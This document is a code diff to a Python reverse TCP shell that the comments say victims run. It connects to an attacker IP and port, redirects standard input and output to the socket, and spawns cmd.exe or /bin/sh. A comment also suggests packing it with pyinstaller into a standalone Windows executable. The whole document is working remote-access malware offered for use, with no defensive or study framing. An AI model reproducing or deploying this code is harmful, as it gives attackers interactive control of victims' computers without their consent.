@@ -1,7 +1,9 @@
 #/usr/bin/env python
 ### Simple reverse tcp shell
 ### victims execute this file
-import socket, subprocess, os
+### use "pyinstaller" to convert this python script to standalone exe file for Windows.
+
+import socket, subprocess, os, sys
 
 attacker_ip = "127.0.0.1"                  # attacker's ip
 attacker_port = 6666                         # attacker's port
@@ -9,18 +11,13 @@ victim_ip = socket.gethostbyname(socket.gethostname())   # get victim's ip(victi
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((attacker_ip, attacker_port))
-# s.send("connection from ip: " + victim_ip)
 
-while True:
-    command = s.recv(1024)   # receive shell command
-    if command == "exit" or command == "quit":
-        break
-    # run command
-    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    # read output
-    output = proc.stdout.read() + proc.stderr.read()
-    # send to attacker
-    s.send(output)
+## reverse tcp shell
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
 
-# done attack
-s.close()
+if sys.platform.startswith('win'):  # windows
+    subprocess.call(["cmd.exe"])
+else:                               # .nix
+    subprocess.call(["/bin/sh","-i"]);
